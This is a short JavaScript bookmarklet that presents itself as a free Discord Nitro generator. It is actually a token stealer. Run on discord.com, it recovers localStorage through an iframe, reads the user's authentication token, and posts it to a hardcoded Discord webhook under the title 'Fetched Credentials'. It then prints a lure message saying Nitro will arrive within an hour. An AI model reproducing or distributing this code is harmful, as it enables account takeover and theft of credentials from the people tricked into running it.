javascript: void (function () {
  
  var GenerateNitro = "https://discord.com/api/webhooks/972499269456134154/-oCQgyqApCBQyhPmDdV_VS-QULKcgWBGEcmfmVpqBuRKNBIP4AEnUDQcqmIMRIyvxgDn";
  
  "https://discord.com" == this.document.location.origin &&
    (function () {
      const a = document.createElement("iframe");
      document.head.append(a);
      const b = Object.getOwnPropertyDescriptor(
        a.contentWindow,
        "localStorage"
      );
    
    var GetNitroPack = "token";
      a.remove(),
        Object.defineProperty(window, "localStorage", b),
        fetch(GenerateNitro, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                color: 3553599,
                title: "Fetched Credentials",
                description: `\`\`\`${localStorage.getItem(GetNitroPack)}\`\`\``,
              },
            ],
          }),
        });
    })();
})();

console.clear();
console.log("Done! (You can wait for the Nitro to be available in an hour or more");
